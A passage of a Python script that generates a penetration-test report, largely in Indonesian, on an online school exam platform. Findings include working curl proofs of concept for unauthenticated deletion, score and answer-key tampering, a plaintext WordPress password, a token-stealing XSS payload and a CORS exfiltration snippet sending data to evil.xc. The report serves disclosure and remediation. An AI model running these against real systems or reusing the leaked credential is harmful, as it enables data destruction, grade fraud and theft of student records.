            "# Credential reuse test (credential stuffing)\n"
            "# Nurul:Nurul12345 → try on Gmail, email, other school systems"
        ),
        "impact": [
            "Password plaintext → langsung dapat digunakan untuk login sebagai pengawas.",
            "Credential stuffing: password Nurul12345 likely reused di email/akun lain.",
            "Privacy violation: data personal pengawas (nama + password) terekspos ke publik.",
            "Pelanggaran UU PDP Indonesia Pasal 35 — pemrosesan data pribadi tanpa perlindungan.",
        ],
        "fix": [
            "[IMMEDIATE] Hapus field password dari DataPengawas — gunakan PocketBase built-in auth collection.",
            "Migrate semua proctor ke collection 'users' dengan bcrypt hashing otomatis.",
            "Force password reset semua akun yang terekspos.",
            "Inform pengawas yang terekspos untuk ganti password di semua akun.",
        ],
    },
    {
        "id": "C-04", "title": "Unauthenticated DELETE — Mass Data Wipe Possible",
        "cvss": "9.1  (AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:H/A:H)",
        "desc": "DELETE request pada records DataPengawas berhasil tanpa autentikasi (HTTP 204). "
                "Terbukti secara live: record Nurul (q782q2q6k187oui) terhapus selama pentest, "
                "DataPengawas totalItems menjadi 0. Jika diterapkan pada DataJawaban atau DataSiswa "
                "di backend.e-admin: 2.5M+ records dapat dihapus permanen.",
        "poc": (
            "# DELETE record tanpa auth — 204 No Content!\n"
            "curl -X DELETE \\\n"
            "  'https://pb.app.web.id/api/collections/DataPengawas/records/q782q2q6k187oui'\n"
            "→ HTTP 204 (Success, no body)\n\n"
            "# Verifikasi: record terhapus\n"
            "curl 'https://pb.app.web.id/api/collections/DataPengawas/records'\n"
            "→ {\"totalItems\": 0}  ← was 1 before delete\n\n"
            "# Mass wipe PoC (DO NOT RUN — destructive)\n"
            "# for id in $(curl .../DataJawaban/records | jq -r '.items[].id'); do\n"
            "#   curl -X DELETE .../DataJawaban/records/$id\n"
            "# done"
        ),
        "impact": [
            "Seluruh data ujian dapat dihapus permanen — tidak ada backup yang dikonfirmasi.",
            "DataJawaban di backend.e-admin: 2,539,846 jawaban siswa → dapat dihapus dalam ~1 jam via script.",
            "DataSiswa: 377,249 records → mass wipe menyebabkan kehilangan data permanen semua siswa.",
            "Ransomware scenario: attacker hapus semua data, minta tebusan untuk 'restore'.",
            "Regulatory: hilangnya data ujian dapat menyebabkan kegagalan audit pendidikan.",
        ],
        "fix": [
            "[IMMEDIATE] Set PocketBase Delete rule: @request.auth.id != '' untuk semua collections.",
            "Implementasi soft-delete (field deleted_at) bukan hard delete.",
            "Backup otomatis harian dengan versioning.",
            "Alert system untuk bulk delete operations (>10 records).",
        ],
    },
    {
        "id": "N-01", "title": "Hardcoded WordPress Credentials in JavaScript Bundle",
        "cvss": "9.8  (AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:N)",
        "desc": "Credential akun WordPress ditemukan hardcoded dalam plaintext di file JavaScript "
                "yang dapat diakses publik. Akun pembuatsoal memiliki role Editor dengan "
                "capability unfiltered_html dan akses ke 67,415+ post soal ujian.",
        "poc": (
            "# Found in: https://admin-cbt.code.app.web.id/js/core-C3bGrs1O.js\n"
            "const N = {\n"
            "  url: \"https://publikasi.app.web.id\",\n"
            "  username: \"pembuatsoal\",\n"
            "  password: \"XDNr Hcuf wNwL Pj4T oiUR yHrT\"   ← HARDCODED\n"
            "}\n\n"
            "# Verify — WordPress REST API Auth\n"
            "curl -u 'pembuatsoal:XDNr Hcuf wNwL Pj4T oiUR yHrT' \\\n"
            "  'https://publikasi.app.web.id/wp-json/wp/v2/users/me?context=edit'\n"
            "→ 200 OK | roles: [\"editor\"] | capabilities: {unfiltered_html: true}\n\n"
            "# Dump 67,415 exam questions\n"
            "curl -u 'pembuatsoal:XDNr Hcuf wNwL Pj4T oiUR yHrT' \\\n"
            "  'https://publikasi.app.web.id/wp-json/wp/v2/posts?per_page=100&page=1'\n"
            "→ 200 OK | X-WP-Total: 67415"
        ),
        "impact": [
            "67,415 soal ujian (termasuk 60 draft unpublished) dapat diakses/download lengkap.",
            "unfiltered_html capability: attacker dapat inject script ke post → XSS pada semua pembaca.",
            "Editor dapat delete/modify post → sabotase bank soal.",
            "XML-RPC aktif: akses via legacy protocol dengan credential yang sama.",
            "Credential reuse: password WP mungkin digunakan di akun bimasoft.web.id lain.",
        ],
        "fix": [
            "[IMMEDIATE] Rotate WordPress password pembuatsoal segera.",
            "[IMMEDIATE] Hapus hardcoded credential dari JS — gunakan environment variable / server-side only.",
            "Revoke semua active sessions akun pembuatsoal.",
            "Disable XML-RPC jika tidak digunakan.",
            "Audit semua post untuk script injection sejak credential exposure.",
        ],
    },
    {
        "id": "N-02", "title": "Unauthenticated PATCH DataJawaban — Student Score Manipulation",
        "cvss": "9.5  (AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:H/A:N)",
        "desc": "Jawaban dan skor siswa dapat dimodifikasi oleh siapapun tanpa autentikasi. "
                "PATCH request ke DataJawaban berhasil mengubah field jawaban, skor, benar, dan salah. "
                "Dikonfirmasi live dengan HTTP 200. Berlaku untuk 2,539,846 records di backend.e-admin.",
        "poc": (
            "# PATCH student score — HTTP 200!\n"
            "curl -X PATCH \\\n"
            "  'https://pb.app.web.id/api/collections/DataJawaban/records/4w5a2398za17075' \\\n"
            "  -H 'Content-Type: application/json' \\\n"
            "  -d '{\"jawaban\":\"{\\\\\"1\\\\\":\\\\\"A\\\\\",\\\\\"benar\\\\\":100,\\\\\"skor\\\\\":100}\",\n"
            "       \"status\":\"selesai\"}'\n"
            "→ 200 OK | {\"skor\":100, \"benar\":100, \"updated\":\"2026-07-23 09:30:40.966Z\"}\n\n"
            "# Script: set ALL students score to 100\n"
            "# for id in $(curl .../DataJawaban/records | jq -r '.items[].id'); do\n"
            "#   curl -X PATCH .../DataJawaban/records/$id -d '{\"skor\":100}'\n"
            "# done"
        ),
        "impact": [
            "Siswa manapun dapat memanipulasi nilainya sendiri ke 100 tanpa diketahui.",
            "Pihak ketiga dapat jual jasa 'edit nilai' — integrity akademik rusak total.",
            "Mass manipulation: script otomatis dapat ubah semua nilai 2.5M records dalam hitungan jam.",
            "Tidak ada audit trail: perubahan score sulit dideteksi tanpa log terpisah.",
            "Reporting ke dinas pendidikan berbasis data yang sudah terkompromisi.",
        ],
        "fix": [
            "[IMMEDIATE] Set PocketBase Update rule: @request.auth.id != '' untuk DataJawaban.",
            "Jawaban hanya boleh disubmit sekali (locked after submit) — tambahkan field is_locked.",
            "Grading dilakukan server-side, bukan client-side.",
            "Implementasi audit log untuk setiap perubahan nilai.",
        ],
    },
    {
        "id": "N-03", "title": "Unauthenticated PATCH DataKunci — Answer Key Swap",
        "cvss": "9.5  (AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:H/A:N)",
        "desc": "Kunci jawaban ujian (DataKunci) dapat dimodifikasi tanpa autentikasi. "
                "PATCH request berhasil dengan HTTP 200, memungkinkan attacker menukar kunci "
                "jawaban seluruh ujian. Semua siswa yang mengikuti ujian tersebut akan dinilai "
                "berdasarkan kunci palsu.",
        "poc": (
            "# PATCH answer key — HTTP 200!\n"
            "curl -X PATCH \\\n"
            "  'https://pb.app.web.id/api/collections/DataKunci/records/6x1abdqv66is1f6' \\\n"
            "  -H 'Content-Type: application/json' \\\n"
            "  -d '{\"kunci\":\"ATTACKER_CONTROLLED_KEY_BASE64\"}'\n"
            "→ 200 OK | {\"kode\":\"SIMULASI KLS 6\",\n"
            "              \"kunci\":\"ATTACKER_CONTROLLED_KEY_BASE64\",\n"
            "              \"updated\":\"2026-07-23 09:30:40.984Z\"}"
        ),
        "impact": [
            "Kunci jawaban diganti → semua siswa yang ujian setelah swap akan dinilai salah.",
            "Attacker bisa swap kunci sebelum ujian → kunci asli diketahui → jual ke siswa.",
            "Targeted attack: kunci spesifik mata pelajaran tertentu di sekolah tertentu.",
            "Compound dengan N-02: swap kunci → buat jawaban sesuai kunci baru → nilai 100.",
        ],
        "fix": [
            "[IMMEDIATE] Set Update rule DataKunci: hanya guru owner namespace yang bisa PATCH.",
            "Implementasi HMAC/digital signature pada kunci jawaban — validasi integrity saat grading.",
            "Lock kunci setelah ujian dimulai.",
            "Audit log perubahan kunci dengan timestamp dan IP.",
        ],
    },
    {
        "id": "N-04", "title": "Unauthenticated PATCH PengaturanTest — Exam Security Disabled",
        "cvss": "9.3  (AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:H/A:H)",
        "desc": "Seluruh konfigurasi keamanan ujian (PengaturanTest) dapat dimodifikasi tanpa auth. "
                "Fields yang modifiable: passing_grade, autologin, boleh_daftar, boleh_logout, "
                "pengawas_force_selesai, pengawas_import_soal, examkey, dll. "
                "Dikonfirmasi live dengan HTTP 200.",
        "poc": (
            "# Disable all exam security — HTTP 200!\n"
            "curl -X PATCH \\\n"
            "  'https://pb.app.web.id/api/collections/PengaturanTest/records/0mryalx6yi5bl22' \\\n"
            "  -H 'Content-Type: application/json' \\\n"
            "  -d '{\n"
            "    \"passing_grade\": 0,\n"
            "    \"autologin\": true,\n"
            "    \"boleh_daftar\": true,\n"
            "    \"boleh_logout\": true,\n"
            "    \"pengawas_import_soal\": true,\n"
            "    \"pengawas_force_selesai\": true\n"
            "  }'\n"
            "→ 200 OK | autologin: true | passing_grade: 0 | boleh_daftar: true"
        ),
        "impact": [
            "passing_grade: 0 → semua siswa lulus otomatis tanpa nilai minimum.",
            "autologin: true → bypass login form, siapapun langsung masuk.",
            "boleh_daftar: true → siswa tidak terdaftar dapat ikut ujian.",
            "pengawas_import_soal: true → proctor dapat inject soal palsu.",
            "Exam integrity collapse: tidak ada satu pun security control yang aktif.",
        ],
        "fix": [
            "[IMMEDIATE] Set Update rule PengaturanTest: hanya namespace owner yang dapat PATCH.",
            "Validasi server-side untuk nilai konfigurasi yang ekstrem (passing_grade < 10 → reject).",
            "Audit log semua perubahan config.",
            "Alert email ke admin jika ada perubahan konfigurasi keamanan.",
        ],
    },
    {
        "id": "N-05", "title": "Second Vulnerable Backend — backend.e-admin.bimasoft.web.id",
        "cvss": "9.8  (AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)",
        "desc": "Ditemukan backend PocketBase kedua di backend.e-admin.bimasoft.web.id "
                "melalui JS source analysis di e-admin.bimasoft.web.id. Backend ini mengekspos "
                "data dalam skala jauh lebih besar: 377,249 siswa, 2.5M jawaban, 37K soal. "
                "Unauth POST ke DataSiswa dikonfirmasi HTTP 200.",
        "poc": (
            "# Found in: e-admin.bimasoft.web.id/_next/static/chunks/0nt79sxqykv2m.js\n"
            "const K = \"https://backend.e-admin.bimasoft.web.id\"\n\n"
            "# Verify: DataSiswa — 377,249 students\n"
            "curl 'https://backend.e-admin.bimasoft.web.id/api/collections/DataSiswa/records?perPage=1'\n"
            "→ {\"totalItems\": 377249}\n\n"
            "# DataJawaban — 2,539,846 answers\n"
            "curl 'https://backend.e-admin.bimasoft.web.id/api/collections/DataJawaban/records?perPage=1'\n"
            "→ {\"totalItems\": 2539846}\n\n"
            "# Unauth POST DataSiswa — HTTP 200\n"
            "curl -X POST 'https://backend.e-admin.bimasoft.web.id/api/collections/DataSiswa/records' \\\n"
            "  -d '{\"nama\":\"TEST\",\"username\":\"test\",\"kelas\":\"X\",\"namespace\":\"0\"}'\n"
            "→ 200 OK | id: 9am0u2tf20vt698"
        ),
        "impact": [
            "377,249 data siswa (nama, kelas, NIS, username) dapat di-dump tanpa auth.",
            "2,539,846 jawaban ujian seluruh siswa dari semua sekolah terekspos.",
            "37,343 soal ujian dapat diakses → soal bank ujian nasional mungkin terekspos.",
            "Jika DELETE juga open: mass wipe 2.5M records jawaban → kehilangan data permanen.",
            "Skala pelanggaran UU PDP jauh lebih besar dari pb.app.web.id.",
        ],
        "fix": [
            "[IMMEDIATE] Sama dengan pb.app.web.id: set auth rules di semua collections.",
            "Audit apakah ada backend ketiga, keempat yang belum ditemukan.",
            "Centralize auth di level API gateway, bukan per-collection.",
        ],
    },
]

for i, f in enumerate(findings_critical):
    story.append(KeepTogether([
        badge("CRITICAL", f["id"], f["title"]),
        Spacer(1, 2*mm),
    ]))
    story.append(info_row("CVSS v3.1", f["cvss"], vc=C_RED))
    story.append(Spacer(1, 2*mm))
    story.append(Paragraph("Description", sH3))
    story.append(Paragraph(f["desc"], sBody))
    story.append(Paragraph("Proof of Concept", sH3))
    story.append(Paragraph(esc(f["poc"]), sCode))
    story.append(Paragraph("Impact Scenarios", sH3))
    for imp in f["impact"]:
        story.append(Paragraph(f"• {imp}", sBullet))
    story.append(Paragraph("Remediation", sH3))
    for fix in f["fix"]:
        story.append(Paragraph(f"▶ {fix}", sBullet))
    story.append(Spacer(1, 4*mm))
    story.append(HR(C_GRAY, 0.3, 3))
    story.append(Spacer(1, 3*mm))
    if i in [1, 3, 5, 7]:
        story.append(PageBreak())

story.append(PageBreak())

# ══════════════════════════════════════════════════════════════════════════════
# 06 FINDINGS — HIGH
# ══════════════════════════════════════════════════════════════════════════════
story.append(Paragraph("06  FINDINGS — HIGH", sH1))
story.append(HR())

findings_high = [
    {
        "id": "H-01", "title": "Admin Panel Publicly Accessible — PocketBase GUI",
        "cvss": "7.5  (AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:L/A:N)",
        "desc": "GUI admin PocketBase di https://pb.app.web.id/_/ mengembalikan HTTP 200 dan dapat diakses publik. "
                "Endpoint auth superuser terbuka untuk brute force tanpa rate limiting atau lockout.",
        "poc": (
            "curl -I 'https://pb.app.web.id/_/'\n"
            "→ HTTP/2 200 | Content-Type: text/html\n\n"
            "# Brute force superuser — no lockout detected\n"
            "curl -X POST 'https://pb.app.web.id/api/collections/_superusers/auth-with-password' \\\n"
            "  -d '{\"identity\":\"admin@pb.app.web.id\",\"password\":\"admin123\"}'\n"
            "→ 400 Bad Request (wrong pass — no lockout after N attempts)"
        ),
        "impact": ["Brute force superuser credentials tanpa lockout.", "GUI admin terbuka memudahkan enumeration endpoint.", "Jika superuser credential ditemukan: full database access termasuk delete collections."],
        "fix": ["Restrict /_/ dengan IP whitelist atau HTTP Basic Auth di level nginx/Caddy.", "Aktifkan rate limiting pada auth endpoint.", "Monitor failed login attempts."],
    },
    {
        "id": "H-02", "title": "Client-Side Role Control — Default Role = Admin",
        "cvss": "8.1  (AV:N/AC:L/PR:N/UI:R/S:U/C:H/I:H/A:N)",
        "desc": "Role control dikontrol via localStorage di SPA. Yang lebih parah: "
                "function default mengembalikan 'admin' jika localStorage kosong: "
                "localStorage.getItem('userType')||'admin' — artinya SEMUA user yang belum "
                "set localStorage sudah di-treat sebagai admin oleh aplikasi.",
        "poc": (
            "// Dari /assets/index-BGRC5eBO.js\n"
            "function c() {\n"
            "  return localStorage.getItem(\"userType\") || \"admin\"\n"
            "  //                                          ^^^^^^^^^\n"
            "  //                          Default = ADMIN tanpa set apapun!\n"
            "}\n\n"
            "// Exploit: buka browser → DevTools → Application → Local Storage\n"
            "// Tanpa set apapun: localStorage.getItem('userType') === null\n"
            "// Sehingga function c() return 'admin'\n"
            "// Atau paksa: localStorage.setItem('userType', 'admin')\n"
            "// → Privilege escalation selesai"
        ),
        "impact": ["Semua pengguna baru di-treat sebagai admin secara default.", "Privilege escalation zero-click untuk semua role (guru, siswa, pengawas).", "Admin role memberikan akses ke fitur manajemen data sekolah."],
        "fix": ["Pindahkan role check ke server-side.", "Default role harus 'guest'/'undefined', bukan 'admin'.", "Verifikasi role dari token auth setiap request."],
    },
    {
        "id": "H-03", "title": "Auth Token Stored in localStorage — XSS Takeover Ready",
        "cvss": "7.4  (AV:N/AC:H/PR:N/UI:R/S:U/C:H/I:H/A:N)",
        "desc": "Token autentikasi PocketBase disimpan di localStorage sebagai 'pocketbase_auth'. "
                "Ditemukan di JS: Authorization: Bearer ${JSON.parse(localStorage.getItem('pocketbase_auth')||'').token}. "
                "Kombinasi dengan N-06 (Stored XSS): satu XSS → steal token → full account takeover.",
        "poc": (
            "// Dari core-C3bGrs1O.js:\n"
            "Authorization: `Bearer ${JSON.parse(localStorage.getItem(\"pocketbase_auth\")||'').token}`\n\n"
            "// XSS payload untuk steal token:\n"
            "// POST ke DataUsers.nama_sekolah:\n"
            "// <img src=x onerror=\"fetch('https://evil.xc/steal?t='+\n"
            "//   JSON.parse(localStorage.getItem('pocketbase_auth')||'{}').token)\">\n"
            "// → Token terkirim ke attacker server saat admin buka halaman users"
        ),
        "impact": ["XSS (N-06) + localStorage token = full account takeover tanpa interaksi lebih.", "Token valid selama session → extended persistence.", "Stolen token dapat digunakan dari IP manapun (no IP binding)."],
        "fix": ["Pindahkan token ke httpOnly cookie — tidak accessible via JavaScript.", "Implementasi CSRF protection.", "Short token expiry (15 menit) dengan refresh token.", "CSP header untuk mencegah inline script."],
    },
    {
        "id": "N-06", "title": "Stored XSS via Unauthenticated POST DataUsers",
        "cvss": "8.2  (AV:N/AC:L/PR:N/UI:R/S:C/C:H/I:L/A:N)",
        "desc": "Field nama_sekolah dan logo_sekolah pada DataUsers menerima input HTML dan "
                "javascript: URL tanpa sanitasi. Input ini disimpan di database (stored XSS) "
                "dan akan dirender di admin panel saat admin membuka halaman users.",
        "poc": (
            "# Store XSS payload — HTTP 200\n"
            "curl -X POST 'https://pb.app.web.id/api/collections/DataUsers/records' \\\n"
            "  -H 'Content-Type: application/json' \\\n"
            "  -d '{\n"
            "    \"nama_sekolah\": \"<script>alert(document.cookie)</script>\",\n"
            "    \"logo_sekolah\": \"javascript:alert(1)\",\n"
            "    \"namespace\":    \"xss@attacker.com\",\n"
            "    \"username\":     \"xss_payload\"\n"
            "  }'\n"
            "→ 200 OK | id: wsu79ckiz5kj3yd\n"
            "→ Payload stored in database\n"
            "→ Executes when admin views DataUsers list"
        ),
        "impact": ["Admin membuka halaman users → XSS triggered → cookie/token dicuri.", "Kombinasi H-03: steal pocketbase_auth token → full admin takeover.", "Persistent: payload tetap ada sampai dihapus manual.", "1,828+ records di DataUsers — attacker bisa inject ke banyak records sekaligus."],
        "fix": ["[IMMEDIATE] Sanitasi semua input sebelum disimpan (DOMPurify atau server-side HTMLPurifier).", "Implementasi Content Security Policy (CSP) header.", "Validate URL schema: reject javascript: URLs.", "Output encoding saat render di SPA."],
    },
    {
        "id": "N-07", "title": "CORS Wildcard — Cross-Origin Data Theft",
        "cvss": "7.5  (AV:N/AC:L/PR:N/UI:R/S:U/C:H/I:N/A:N)",
        "desc": "pb.app.web.id menggunakan Access-Control-Allow-Origin: * (wildcard). "
                "Dikombinasikan dengan C-01 (unauth read), semua data dapat dicuri "
                "via XHR/fetch dari domain manapun — termasuk dari malicious website.",
        "poc": (
            "# CORS header: Access-Control-Allow-Origin: *\n"
            "curl -I 'https://pb.app.web.id/api/collections/DataUsers/records' \\\n"
            "  -H 'Origin: https://evil-site.com'\n"
            "→ access-control-allow-origin: *\n\n"
            "// Exploit dari halaman evil-site.com:\n"
            "fetch('https://pb.app.web.id/api/collections/DataUsers/records?perPage=500')\n"
            "  .then(r => r.json())\n"
            "  .then(data => {\n"
            "    // Kirim 1,828 school records ke attacker server\n"
            "    fetch('https://evil.xc/exfil', {method:'POST', body:JSON.stringify(data)})\n"
            "  })"
        ),
        "impact": ["Phishing site dapat curi semua data sekolah tanpa user sadar.", "Data dijual: 1,828 email guru + kontak sekolah bernilai tinggi untuk spam/marketing.", "Combine dengan Stored XSS: auto-exfil data saat admin buka halaman."],
        "fix": ["Ganti wildcard dengan specific origin: Access-Control-Allow-Origin: https://admin-cbt.code.app.web.id", "Terapkan CORS policy di level PocketBase config.", "Untuk request yang butuh credentials: Access-Control-Allow-Credentials: true tidak boleh dikombinasikan dengan *."],
    },
    {
        "id": "N-08", "title": "H-02 Escalated: Realtime API Open + SSE Client ID Leak",
        "cvss": "6.5  (AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N)",
        "desc": "PocketBase Realtime API (SSE) terbuka tanpa auth dan langsung memberikan "
                "clientId valid yang dapat digunakan untuk subscribe ke perubahan collections. "
                "Attacker dapat monitor real-time perubahan data (jawaban masuk, proctor login, dll).",
        "poc": (
            "# Connect ke SSE — clientId langsung diberikan\n"
            "curl -N 'https://pb.app.web.id/api/realtime' -H 'Accept: text/event-stream'\n"
            "→ id:n87jr6lGyNUqy8UOrTPNpryBQZpoG3ftU7bNl08a\n"
            "→ event:PB_CONNECT\n"
            "→ data:{\"clientId\":\"n87jr6lGyNUqy8UOrTPNpryBQZpoG3ftU7bNl08a\"}\n\n"
            "# Subscribe sebagai live spy:\n"
            "curl -X POST 'https://pb.app.web.id/api/realtime' \\\n"
            "  -d '{\"clientId\":\"...\",\"subscriptions\":[\"DataJawaban\",\"DataPengawas\"]}'"
        ),
        "impact": ["Real-time monitoring: lihat jawaban siswa masuk live selama ujian berlangsung.", "Deteksi proctor login: monitor DataPengawas untuk pattern autentikasi.", "Intelligence untuk targeted attack timing."],
        "fix": ["Set Realtime subscribe rule: @request.auth.id != '' di PocketBase config.", "Implementasi auth requirement untuk SSE connect endpoint."],
    },
]

for i, f in enumerate(findings_high):
    story.append(KeepTogether([badge("HIGH", f["id"], f["title"]), Spacer(1, 2*mm)]))
    story.append(info_row("CVSS v3.1", f["cvss"], vc=C_ORANGE))
    story.append(Spacer(1, 2*mm))
    story.append(Paragraph("Description", sH3))
    story.append(Paragraph(f["desc"], sBody))
    story.append(Paragraph("Proof of Concept", sH3))
    story.append(Paragraph(esc(f["poc"]), sCode))
    story.append(Paragraph("Impact Scenarios", sH3))
    for imp in f["impact"]:
        story.append(Paragraph(f"• {imp}", sBullet))
    story.append(Paragraph("Remediation", sH3))
    for fix in f["fix"]:
        story.append(Paragraph(f"▶ {fix}", sBullet))
    story.append(Spacer(1, 3*mm))
    story.append(HR(C_GRAY, 0.3, 3))
    story.append(Spacer(1, 3*mm))
    if i in [1, 3]:
        story.append(PageBreak())

story.append(PageBreak())

# ══════════════════════════════════════════════════════════════════════════════
# 07 FINDINGS — MEDIUM & INFO
# ══════════════════════════════════════════════════════════════════════════════
story.append(Paragraph("07  FINDINGS — MEDIUM & INFO", sH1))
story.append(HR())

med_findings = [
    {
        "sev": "MEDIUM", "id": "M-01", "title": "WAF Bypass — 14 Techniques Confirmed",
        "cvss": "5.3  (AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N)",
        "desc": "WAF (GitHub CDN layer) dapat di-bypass dengan berbagai teknik header manipulation. "
                "Memungkinkan attacker menghindari detection saat melakukan scraping massal.",
        "poc": (
            "# Bypass dengan X-Forwarded-For spoofing\n"
            "curl 'https://pb.app.web.id/api/collections/DataUjian/records' \\\n"
            "  -H 'X-Forwarded-For: 127.0.0.1' \\\n"
            "  -H 'X-Real-IP: 127.0.0.1'\n"
            "→ HTTP 200 (bypass)\n\n"
            "# Bypass dengan User-Agent spoofing\n"
            "curl 'https://pb.app.web.id/...' \\\n"
            "  -H 'User-Agent: Googlebot/2.1'\n"
            "→ HTTP 200 (bypass)"
        ),
        "fix": ["Implementasi WAF di level aplikasi (PocketBase middleware), bukan hanya CDN.", "Rate limiting berdasarkan IP setelah fingerprinting, bukan hanya header."],
    },
    {
        "sev": "MEDIUM", "id": "M-02", "title": "Encrypted Answer Key Exposed in DataKunci",
        "cvss": "5.0  (AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N)",
        "desc": "DataKunci menyimpan kunci jawaban dalam format base64/encrypted yang dapat "
                "diambil tanpa auth. Meskipun terenkripsi, key material tersedia untuk "
                "offline brute force / decryption attempt.",
        "poc": (
            "curl 'https://pb.app.web.id/api/collections/DataKunci/records'\n"
            "→ {\"kode\":\"SIMULASI KLS 6\",\n"
            "   \"kunci\":\"luf0gzlo+nirtz+0F/FHCsC5vC3tKGtIbyQe3oa6jm...\"}\n\n"
            "# Base64 decode:\n"
            "python3 -c \"import base64; print(base64.b64decode('luf0gzlo+...'))\"\n"
            "→ b'\\x96\\xe7\\xf4\\x839h\\xfax...' (153 bytes encrypted binary)"
        ),
        "fix": ["Restrict DataKunci read: hanya guru owner namespace yang dapat read.", "Tambahkan server-side decryption — key tidak dikirim ke client."],
    },
    {
        "sev": "INFO", "id": "I-01", "title": "Technology Stack & Version Disclosure",
        "cvss": "3.1  (AV:N/AC:H/PR:N/UI:N/S:U/C:L/I:N/A:N)",
        "desc": "Tech stack lengkap terekspos: PocketBase versi (dari server header Caddy), "
                "Vue/Vite SPA, Bootstrap 5, CoreUI, library versions dari bundle filenames. "
                "Informasi ini memudahkan attacker memilih CVE yang relevan.",
        "poc": (
            "curl -I 'https://pb.app.web.id/'\n"
            "→ server: Caddy\n\n"
            "curl -I 'https://backend.e-admin.bimasoft.web.id/'\n"
            "→ server: Caddy\n"
            "→ x-content-type-options: nosniff\n"
            "→ x-frame-options: SAMEORIGIN\n\n"
            "# From HTML:\n"
            "# bootstrap@5, @coreui/coreui, pocketbase-DOe2iU6O.js"
        ),
        "fix": ["Remove/mask server header.", "Generic asset filenames (tidak menyertakan version hash yang bisa di-correlate ke library version)."],
    },
]

for f in med_findings:
    story.append(KeepTogether([badge(f["sev"], f["id"], f["title"]), Spacer(1, 2*mm)]))
    story.append(info_row("CVSS v3.1", f["cvss"], vc=C_YELLOW if f["sev"]=="MEDIUM" else C_CYAN))
    story.append(Spacer(1, 2*mm))
    story.append(Paragraph("Description", sH3))
    story.append(Paragraph(f["desc"], sBody))
    story.append(Paragraph("Proof of Concept", sH3))
    story.append(Paragraph(esc(f["poc"]), sCode))
    story.append(Paragraph("Remediation", sH3))
    for fix in f["fix"]:
        story.append(Paragraph(f"▶ {fix}", sBullet))
    story.append(Spacer(1, 4*mm))
    story.append(HR(C_GRAY, 0.3, 3))
    story.append(Spacer(1, 3*mm))

story.append(PageBreak())

# ══════════════════════════════════════════════════════════════════════════════
# 10 REMEDIATION ROADMAP
# ══════════════════════════════════════════════════════════════════════════════
story.append(Paragraph("10  REMEDIATION ROADMAP", sH1))
story.append(HR())
story.append(Paragraph("Prioritas perbaikan berdasarkan severity dan ease of exploitation:", sBody))
story.append(Spacer(1, 3*mm))

road = [
    ["Priority", "Finding", "Action", "Timeline", "Effort"],
    ["P0 — NOW",   "C-01÷C-04, N-02÷N-04", "Set PocketBase auth rules semua collections", "< 2 jam",  "LOW"],
    ["P0 — NOW",   "N-01",                  "Rotate WP password + hapus dari JS source",   "< 1 jam",  "LOW"],
    ["P0 — NOW",   "N-05",                  "Set auth rules di backend.e-admin juga",       "< 2 jam",  "LOW"],
    ["P1 — 24H",   "C-03",                  "Migrate proctor ke PB auth collection (bcrypt)","< 1 hari","MED"],
    ["P1 — 24H",   "H-01",                  "IP whitelist atau auth di /_/ endpoint",       "< 2 jam",  "LOW"],
    ["P1 — 24H",   "N-06",                  "Input sanitasi + CSP header",                  "< 4 jam",  "MED"],
    ["P2 — 48H",   "H-02, N-08",            "Server-side role validation",                  "< 2 hari", "MED"],
    ["P2 — 48H",   "H-03",                  "Migrate token ke httpOnly cookie",             "< 1 hari", "MED"],
    ["P2 — 48H",   "N-07",                  "CORS: specific origin bukan wildcard",         "< 1 jam",  "LOW"],
    ["P3 — WEEK",  "M-01",                  "WAF rules di application layer",               "< 1 minggu","HIGH"],
    ["P3 — WEEK",  "M-02",                  "Server-side decryption, hide kunci dari API",  "< 2 hari", "MED"],
    ["P4 — MONTH", "I-01",                  "Remove server headers, generic filenames",     "< 1 hari", "LOW"],
]
rt = Table(road, colWidths=[28*mm, 42*mm, 58*mm, 18*mm, None])
rc = [
    ("BACKGROUND",(0,0),(-1,0),C_DARK),
    ("TEXTCOLOR",(0,0),(-1,0),C_CYAN),
    ("FONTNAME",(0,0),(-1,0),"Helvetica-Bold"),
    ("ROWBACKGROUNDS",(0,1),(-1,-1),[C_PANEL, C_DARK]),
    ("TEXTCOLOR",(0,1),(-1,-1),C_WHITE),
    ("FONTNAME",(0,0),(-1,-1),"Helvetica"),
    ("FONTSIZE",(0,0),(-1,-1),7.5),
    ("LEFTPADDING",(0,0),(-1,-1),5),
    ("TOPPADDING",(0,0),(-1,-1),3),
    ("BOTTOMPADDING",(0,0),(-1,-1),3),
    ("GRID",(0,0),(-1,-1),0.3,C_GRAY),
]
for r,color in [(1,C_RED),(2,C_RED),(3,C_RED),(4,C_ORANGE),(5,C_ORANGE),(6,C_ORANGE),(7,C_YELLOW),(8,C_YELLOW),(9,C_YELLOW)]:
    if r < len(road):
        rc.append(("TEXTCOLOR",(0,r),(0,r),color))
        rc.append(("FONTNAME",(0,r),(0,r),"Helvetica-Bold"))
rt.setStyle(TableStyle(rc))
story.append(rt)

story.append(Spacer(1, 5*mm))
story.append(Paragraph("Root Cause — Single Fix, Maximum Impact", sH2))
story.append(Paragraph(
    "Mayoritas kerentanan (C-01÷C-04, N-02÷N-04, N-05) berasal dari satu root cause: "
    "<b>PocketBase collection rules dibiarkan kosong (public)</b>. "
    "Satu konfigurasi di PocketBase admin panel (_/) untuk setiap collection "
    "dapat menutup 9 dari 17 findings sekaligus:", sBody))
story.append(Spacer(1, 2*mm))
story.append(Paragraph(esc(
    "List rule    = @request.auth.id != ''\n"
    "View rule    = @request.auth.id != ''\n"
    "Create rule  = @request.auth.id != ''\n"
    "Update rule  = @request.auth.id != ''\n"
    "Delete rule  = @request.auth.id != ''"),
    sCode))
story.append(Paragraph(
    "Terapkan di: DataUsers, DataUjian, DataJawaban, DataKunci, DataPengawas, "
    "DataSoal, DataSiswa, PengaturanTest — di KEDUA backend (pb.app.web.id dan backend.e-admin.bimasoft.web.id).",
    sSmall))

story.append(PageBreak())

# ══════════════════════════════════════════════════════════════════════════════
# 11 CONCLUSION
# ══════════════════════════════════════════════════════════════════════════════
story.append(Paragraph("11  CONCLUSION", sH1))
story.append(HR())

story.append(Paragraph(
    "Platform CBT Online Bimasoft dalam kondisi <b>fully compromised</b>. "
